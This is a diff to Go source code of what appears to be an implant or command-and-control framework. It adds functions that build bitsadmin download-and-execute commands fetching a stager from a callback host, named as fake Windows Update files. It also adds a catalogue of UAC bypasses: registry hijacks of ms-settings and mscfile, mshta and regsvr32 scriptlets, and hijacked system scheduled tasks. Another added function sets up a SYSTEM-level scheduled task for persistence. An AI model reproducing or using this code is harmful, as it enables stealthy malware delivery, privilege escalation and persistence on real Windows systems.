@@ -5,6 +5,51 @@ import (
 	"strings"
 )
 
+// escapeWindowsCommand properly escapes a command for Windows cmd.exe
+// This handles nested quotes and special characters
+func escapeWindowsCommand(cmd string) string {
+	// If command contains quotes, we need to escape them properly
+	// For cmd.exe, we escape quotes by doubling them
+	if strings.Contains(cmd, `"`) {
+		// Replace " with "" for cmd.exe escaping
+		cmd = strings.ReplaceAll(cmd, `"`, `""`)
+	}
+	// Wrap in quotes if contains spaces
+	if strings.Contains(cmd, " ") {
+		return `"` + cmd + `"`
+	}
+	return cmd
+}
+
+// generateSimplePayload generates a simple payload command that downloads and executes
+// This avoids complex nesting that breaks quote handling
+func generateSimplePayload(callbackURL string) string {
+	// Use a simpler approach: create a batch file, download to it, execute it
+	// This avoids quote nesting issues
+	batchFile := `%TEMP%\WindowsUpdate.bat`
+	exeFile := `%TEMP%\WindowsUpdate.exe`
+	
+	// Create batch file that downloads and executes
+	batchContent := fmt.Sprintf(`@echo off
+bitsadmin /transfer "MicrosoftUpdate" /download /priority normal "%s/stager" "%s" >nul 2>&1
+if exist "%s" (
+    start /b "" "%s"
+    timeout /t 1 /nobreak >nul 2>&1
+    del "%s" >nul 2>&1
+)
+del "%%~f0" >nul 2>&1`, callbackURL, exeFile, exeFile, exeFile, exeFile)
+	
+	// Write batch file using echo commands (no file creation needed for cmd.exe)
+	// Actually, we need to use a different approach - cmd.exe can't easily create multi-line files
+	// Better: use a single-line command with proper escaping
+	
+	// Alternative: Use certutil to download to a .bat file, then execute
+	// Or: Use a simpler single-line approach
+	
+	// Simplest: Download directly and execute in one command
+	return fmt.Sprintf(`bitsadmin /transfer "MicrosoftUpdate" /download /priority normal "%s/stager" "%s" && start /b "" "%s"`, callbackURL, exeFile, exeFile)
+}
+
 // LOLBinEscalation provides stealthy privilege escalation using only LOLBins
 type LOLBinEscalation struct{}
 
@@ -169,6 +214,235 @@ func (l *LOLBinEscalation) GetUserToAdminMethods() []LOLBinMethod {
 			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
 			NoiseLevel: "Low",
 		},
+		{
+			Name:           "mshta.exe UAC Bypass",
+			Description:    "Uses mshta.exe to execute elevated code via HTA file",
+			EscalationType: "User->Admin",
+			Commands: []string{
+				`echo ^<script^>new ActiveXObject("WScript.Shell").Run("cmd.exe /c %s",0)^</script^> > %TEMP%\update.hta`,
+				`mshta.exe %TEMP%\update.hta`,
+				`cmd.exe /c "ping 127.0.0.1 -n 2 >nul"`,
+				`del %TEMP%\update.hta`,
+			},
+			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
+			NoiseLevel: "Low",
+		},
+		{
+			Name:           "regsvr32.exe UAC Bypass",
+			Description:    "Uses regsvr32.exe to execute elevated code via SCT file",
+			EscalationType: "User->Admin",
+			Commands: []string{
+				`echo ^<?XML version="1.0"?^>^<scriptlet^>^<registration progid="WindowsUpdate" classid="{00000000-0000-0000-0000-000000000000}"^>^<script language="JScript"^>new ActiveXObject("WScript.Shell").Run("cmd.exe /c %s",0);^</script^>^</registration^>^</scriptlet^> > %TEMP%\update.sct`,
+				`regsvr32.exe /s /n /u /i:%TEMP%\update.sct scrobj.dll`,
+				`cmd.exe /c "ping 127.0.0.1 -n 2 >nul"`,
+				`del %TEMP%\update.sct`,
+			},
+			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
+			NoiseLevel: "Low",
+		},
+		{
+			Name:           "DiskCleanup Scheduled Task",
+			Description:    "Hijacks DiskCleanup scheduled task that runs as admin",
+			EscalationType: "User->Admin",
+			Commands: []string{
+				`schtasks /change /tn "Microsoft\Windows\DiskCleanup\SilentCleanup" /tr "%s" /f`,
+				`schtasks /run /tn "Microsoft\Windows\DiskCleanup\SilentCleanup"`,
+				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
+				`schtasks /change /tn "Microsoft\Windows\DiskCleanup\SilentCleanup" /tr "%%windir%%\system32\cleanmgr.exe /autoclean /d %%c:%%" /f`,
+			},
+			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
+			NoiseLevel: "Medium",
+		},
+		{
+			Name:           "WinSAT Registry Hijack",
+			Description:    "Exploits WinSAT.exe auto-elevation via registry hijack",
+			EscalationType: "User->Admin",
+			Commands: []string{
+				`reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /d "%s" /f`,
+				`reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v "DelegateExecute" /t REG_SZ /d "" /f`,
+				`winsat.exe formal`,
+				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
+				`reg delete "HKCU\Software\Classes\ms-settings\shell\open\command" /f`,
+			},
+			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
+			NoiseLevel: "Low",
+		},
+		{
+			Name:           "DISM.exe Registry Hijack",
+			Description:    "Exploits DISM.exe auto-elevation via registry hijack",
+			EscalationType: "User->Admin",
+			Commands: []string{
+				`reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /d "%s" /f`,
+				`reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v "DelegateExecute" /t REG_SZ /d "" /f`,
+				`dism.exe /online /cleanup-image /restorehealth`,
+				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
+				`reg delete "HKCU\Software\Classes\ms-settings\shell\open\command" /f`,
+			},
+			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
+			NoiseLevel: "Low",
+		},
+		{
+			Name:           "Slui.exe Registry Hijack",
+			Description:    "Exploits slui.exe auto-elevation via registry hijack",
+			EscalationType: "User->Admin",
+			Commands: []string{
+				`reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /d "%s" /f`,
+				`reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v "DelegateExecute" /t REG_SZ /d "" /f`,
+				`slui.exe`,
+				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
+				`reg delete "HKCU\Software\Classes\ms-settings\shell\open\command" /f`,
+			},
+			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
+			NoiseLevel: "Low",
+		},
+		{
+			Name:           "PkgMgr.exe Registry Hijack",
+			Description:    "Exploits pkgmgr.exe auto-elevation via registry hijack",
+			EscalationType: "User->Admin",
+			Commands: []string{
+				`reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /d "%s" /f`,
+				`reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v "DelegateExecute" /t REG_SZ /d "" /f`,
+				`pkgmgr.exe /iu:"WindowsUpdate"`,
+				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
+				`reg delete "HKCU\Software\Classes\ms-settings\shell\open\command" /f`,
+			},
+			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
+			NoiseLevel: "Low",
+		},
+		{
+			Name:           "Explorer.exe ShellExecute",
+			Description:    "Uses explorer.exe to execute elevated code via ShellExecute",
+			EscalationType: "User->Admin",
+			Commands: []string{
+				`explorer.exe shell:appsFolder\Microsoft.Windows.SecHealthUI_cw5n1h2txyewy!WindowsSecurity`,
+				`cmd.exe /c "ping 127.0.0.1 -n 2 >nul"`,
+				`explorer.exe "%s"`,
+			},
+			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
+			NoiseLevel: "Low",
+		},
+		{
+			Name:           "Write.exe Registry Hijack",
+			Description:    "Exploits write.exe auto-elevation via registry hijack",
+			EscalationType: "User->Admin",
+			Commands: []string{
+				`reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /d "%s" /f`,
+				`reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v "DelegateExecute" /t REG_SZ /d "" /f`,
+				`write.exe`,
+				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
+				`reg delete "HKCU\Software\Classes\ms-settings\shell\open\command" /f`,
+			},
+			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
+			NoiseLevel: "Low",
+		},
+		{
+			Name:           "Credwiz.exe Registry Hijack",
+			Description:    "Exploits credwiz.exe auto-elevation via registry hijack",
+			EscalationType: "User->Admin",
+			Commands: []string{
+				`reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /d "%s" /f`,
+				`reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v "DelegateExecute" /t REG_SZ /d "" /f`,
+				`credwiz.exe`,
+				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
+				`reg delete "HKCU\Software\Classes\ms-settings\shell\open\command" /f`,
+			},
+			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
+			NoiseLevel: "Low",
+		},
+		{
+			Name:           "CLIConfg.exe Registry Hijack",
+			Description:    "Exploits cliconfg.exe auto-elevation via registry hijack",
+			EscalationType: "User->Admin",
+			Commands: []string{
+				`reg add "HKCU\Software\Classes\CLSID\{00000000-0000-0000-0000-000000000000}\InprocServer32" /d "%s" /f`,
+				`cliconfg.exe`,
+				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
+				`reg delete "HKCU\Software\Classes\CLSID\{00000000-0000-0000-0000-000000000000}\InprocServer32" /f`,
+			},
+			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
+			NoiseLevel: "Low",
+		},
+		{
+			Name:           "WinStore.exe Registry Hijack",
+			Description:    "Exploits WinStore.exe auto-elevation via registry hijack",
+			EscalationType: "User->Admin",
+			Commands: []string{
+				`reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /d "%s" /f`,
+				`reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v "DelegateExecute" /t REG_SZ /d "" /f`,
+				`WinStore.exe`,
+				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
+				`reg delete "HKCU\Software\Classes\ms-settings\shell\open\command" /f`,
+			},
+			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
+			NoiseLevel: "Low",
+		},
+		{
+			Name:           "MMC.exe Registry Hijack",
+			Description:    "Exploits mmc.exe auto-elevation via mscfile registry hijack",
+			EscalationType: "User->Admin",
+			Commands: []string{
+				`reg add "HKCU\Software\Classes\mscfile\shell\open\command" /d "%s" /f`,
+				`start mmc.exe gpedit.msc`,
+				`cmd.exe /c "ping 127.0.0.1 -n 4 >nul"`,
+				`reg delete "HKCU\Software\Classes\mscfile\shell\open\command" /f`,
+			},
+			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
+			NoiseLevel: "Low",
+		},
+		{
+			Name:           "WinStoreApp.exe Registry Hijack",
+			Description:    "Exploits WinStoreApp.exe auto-elevation via registry hijack",
+			EscalationType: "User->Admin",
+			Commands: []string{
+				`reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /d "%s" /f`,
+				`reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v "DelegateExecute" /t REG_SZ /d "" /f`,
+				`WinStoreApp.exe`,
+				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
+				`reg delete "HKCU\Software\Classes\ms-settings\shell\open\command" /f`,
+			},
+			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
+			NoiseLevel: "Low",
+		},
+		{
+			Name:           "CompMgmtLauncher.exe Registry Hijack",
+			Description:    "Exploits CompMgmtLauncher.exe auto-elevation via registry hijack",
+			EscalationType: "User->Admin",
+			Commands: []string{
+				`reg add "HKCU\Software\Classes\mscfile\shell\open\command" /d "%s" /f`,
+				`CompMgmtLauncher.exe compmgmt.msc`,
+				`cmd.exe /c "ping 127.0.0.1 -n 4 >nul"`,
+				`reg delete "HKCU\Software\Classes\mscfile\shell\open\command" /f`,
+			},
+			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
+			NoiseLevel: "Low",
+		},
+		{
+			Name:           "WerFault.exe Registry Hijack",
+			Description:    "Exploits WerFault.exe auto-elevation via registry hijack",
+			EscalationType: "User->Admin",
+			Commands: []string{
+				`reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /d "%s" /f`,
+				`reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v "DelegateExecute" /t REG_SZ /d "" /f`,
+				`werfault.exe`,
+				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
+				`reg delete "HKCU\Software\Classes\ms-settings\shell\open\command" /f`,
+			},
+			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
+			NoiseLevel: "Low",
+		},
+		{
+			Name:           "TaskScheduler Task Hijack",
+			Description:    "Hijacks TaskScheduler tasks that run as admin",
+			EscalationType: "User->Admin",
+			Commands: []string{
+				`schtasks /change /tn "Microsoft\Windows\TaskScheduler\Maintenance" /tr "%s" /f`,
+				`schtasks /run /tn "Microsoft\Windows\TaskScheduler\Maintenance"`,
+				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
+				`schtasks /change /tn "Microsoft\Windows\TaskScheduler\Maintenance" /tr "%%windir%%\system32\taskschd.exe" /f`,
+			},
+			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
+			NoiseLevel: "Medium",
+		},
 	}
 }
 
@@ -312,30 +586,47 @@ func (l *LOLBinEscalation) GenerateFilelessPayload(callbackURL string) string {
 	return payload
 }
 
+// escapeForRegAdd escapes a command for use in reg add /d parameter
+// The /d parameter needs quotes, so we need to escape internal quotes
+func escapeForRegAdd(cmd string) string {
+	// Replace " with \" for reg add /d parameter
+	return strings.ReplaceAll(cmd, `"`, `\"`)
+}
+
+// escapeForSchtasks escapes a command for use in schtasks /tr parameter
+// The /tr parameter needs quotes, so we need to escape internal quotes
+func escapeForSchtasks(cmd string) string {
+	// Replace " with \" for schtasks /tr parameter
+	return strings.ReplaceAll(cmd, `"`, `\"`)
+}
+
+// escapeForScBinPath escapes a command for use in sc create binPath= parameter
+// The binPath= parameter needs quotes, so we need to escape internal quotes
+func escapeForScBinPath(cmd string) string {
+	// Replace " with \" for sc binPath= parameter
+	return strings.ReplaceAll(cmd, `"`, `\"`)
+}
+
 // GenerateSpawnCommand generates a command to spawn new beacon using only LOLBins
 func (l *LOLBinEscalation) GenerateSpawnCommand(callbackURL string, targetPriv string) string {
 	// Generate a command that spawns a new beacon using only native Windows tools
-	// No PowerShell, no suspicious downloads, uses legitimate Windows components
+	// Use a simple approach without complex nesting
 	
-	// For spawning, we'll use a simpler approach - just download and execute
-	// Use bitsadmin to download the stager
 	tempFile := `%TEMP%\WindowsUpdate.exe`
-	downloadCmd := fmt.Sprintf(`bitsadmin /transfer "MicrosoftUpdate" /download /priority normal "%s/stager" "%s"`, callbackURL, tempFile)
 	
-	// Execute command - use cmd.exe /c to wrap if needed
-	execCmd := fmt.Sprintf(`start /b "" "%s"`, tempFile)
+	// Simple download and execute command - NO QUOTES in the command itself
+	// Use environment variables to avoid quote issues
+	downloadAndExec := fmt.Sprintf(`bitsadmin /transfer MicrosoftUpdate /download /priority normal %s/stager %s && start /b "" %s`, callbackURL, tempFile, tempFile)
 	
 	if targetPriv == "system" {
-		// For SYSTEM, use a scheduled task approach
-		// Combine download and execute into one command string
-		// Use cmd.exe /c to chain commands properly
-		combinedCmd := fmt.Sprintf(`cmd.exe /c "%s && %s"`, downloadCmd, execCmd)
-		return fmt.Sprintf(`schtasks /create /tn "Microsoft\Windows\WindowsUpdate\UpdateCheck" /tr "%s" /sc onlogon /ru SYSTEM /f`, combinedCmd)
+		// For SYSTEM, wrap in scheduled task
+		// Escape quotes for scheduled task /tr parameter
+		escapedCmd := escapeForSchtasks(downloadAndExec)
+		return fmt.Sprintf(`schtasks /create /tn "Microsoft\Windows\WindowsUpdate\UpdateCheck" /tr "%s" /sc onlogon /ru SYSTEM /f`, escapedCmd)
 	}
 	
-	// For Admin, use start command with background execution
-	// Wrap in cmd.exe /c for proper command chaining
-	return fmt.Sprintf(`cmd.exe /c "%s && %s"`, downloadCmd, execCmd)
+	// For Admin, return the command directly
+	return downloadAndExec
 }
 
 // DetectPrivilegeLevel uses native Windows commands to detect privilege level
